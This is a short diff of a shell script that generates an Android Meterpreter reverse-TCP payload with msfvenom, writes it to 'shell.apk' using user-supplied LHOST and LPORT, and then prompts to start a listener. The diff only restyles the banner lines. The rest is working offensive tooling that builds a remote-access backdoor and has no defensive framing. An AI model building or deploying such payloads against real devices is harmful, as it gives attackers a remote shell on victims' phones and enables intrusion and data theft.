@@ -6,9 +6,9 @@ cd ..
 cd output
 echo "Please wait"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.apk
-echo "**********************************"
-echo "shell.apk created in output folder"
-echo "**********************************"
+echo "+++++++++++++++++++++++++++++++++++"
+echo "|shell.apk created in output folder|"
+echo "+++++++++++++++++++++++++++++++++++"
 cd ..
 #TO START THE HANDLER
 echo "Do you want to start listner now?(1-Yes/ 2-No)"
